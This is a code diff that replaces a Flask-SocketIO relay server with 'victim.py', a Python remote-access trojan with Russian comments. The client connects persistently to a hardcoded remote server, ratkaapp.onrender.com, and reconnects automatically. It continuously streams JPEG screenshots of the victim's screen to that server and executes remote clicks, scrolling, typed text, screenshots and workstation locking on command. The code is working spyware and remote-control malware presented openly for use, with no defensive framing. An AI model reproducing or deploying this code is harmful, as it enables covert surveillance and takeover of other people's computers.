@@ -1,35 +1,80 @@
-from flask import Flask, render_template
-from flask_socketio import SocketIO, emit
+# victim.py - ПОДКЛЮЧАЕТСЯ ПО WEBSOCKET
+import socketio
+import time
+import threading
 import base64
-import json
+import io
+import pyautogui
+from PIL import ImageGrab
 
-app = Flask(__name__)
-socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')
+DOMAIN = "https://ratkaapp.onrender.com"  # ТВОЙ ДОМЕН!
 
-# Храним последний кадр
-current_frame = None
-
-@app.route('/')
-def index():
-    return render_template('index.html')
-
-@socketio.on('connect')
-def handle_connect():
-    print('[+] Клиент подключился')
-    emit('status', {'status': 'connected'})
-
-@socketio.on('frame')
-def handle_frame(data):
-    """Принимает кадр от жертвы через WebSocket"""
-    global current_frame
-    current_frame = data
-    # Отправляем ВСЕМ админам
-    emit('frame', data, broadcast=True, include_self=False)
-
-@socketio.on('command')
-def handle_command(data):
-    """Отправляет команду жертве"""
-    emit('command', data, broadcast=True)
+class Victim:
+    def __init__(self):
+        self.running = True
+        self.sio = socketio.Client()
+        
+        @self.sio.event
+        def connect():
+            print('[+] Подключено!')
+            self.sio.emit('victim_connect')
+            threading.Thread(target=self.send_screen, daemon=True).start()
+        
+        @self.sio.event
+        def command(data):
+            self.execute_command(data.get('cmd'), data.get('val'))
+        
+        @self.sio.event
+        def disconnect():
+            print('[-] Отключено')
+            self.running = False
+        
+        self.connect()
+    
+    def connect(self):
+        while self.running:
+            try:
+                self.sio.connect(DOMAIN)
+                self.sio.wait()
+            except:
+                print('[+] Переподключение...')
+                time.sleep(5)
+    
+    def send_screen(self):
+        while self.running and self.sio.connected:
+            try:
+                screenshot = ImageGrab.grab()
+                width, height = screenshot.width // 2, screenshot.height // 2
+                screenshot = screenshot.resize((width, height))
+                buf = io.BytesIO()
+                screenshot.save(buf, format='JPEG', quality=30)
+                b64 = base64.b64encode(buf.getvalue()).decode('utf-8')
+                self.sio.emit('victim_frame', b64)
+                time.sleep(0.05)
+            except:
+                time.sleep(1)
+    
+    def execute_command(self, cmd, val):
+        print(f'[CMD] {cmd} = {val}')
+        try:
+            if cmd == 'click':
+                screen = ImageGrab.grab()
+                x = int((val.get('x', 50) / 100) * screen.width)
+                y = int((val.get('y', 50) / 100) * screen.height)
+                pyautogui.click(x, y)
+            elif cmd == 'scroll':
+                pyautogui.scroll(120 if val.get('delta') == 'up' else -120)
+            elif cmd == 'type':
+                pyautogui.typewrite(val.get('text', ''))
+            elif cmd == 'screenshot':
+                ImageGrab.grab().save(f"screenshot_{int(time.time())}.png")
+            elif cmd == 'lock':
+                import ctypes
+                ctypes.windll.user32.LockWorkStation()
+            elif cmd == 'disconnect':
+                self.running = False
+        except Exception as e:
+            print(f'[-] Ошибка {cmd}: {e}')
 
 if __name__ == '__main__':
-    socketio.run(app, host='0.0.0.0', port=5000)
+    victim = Victim()
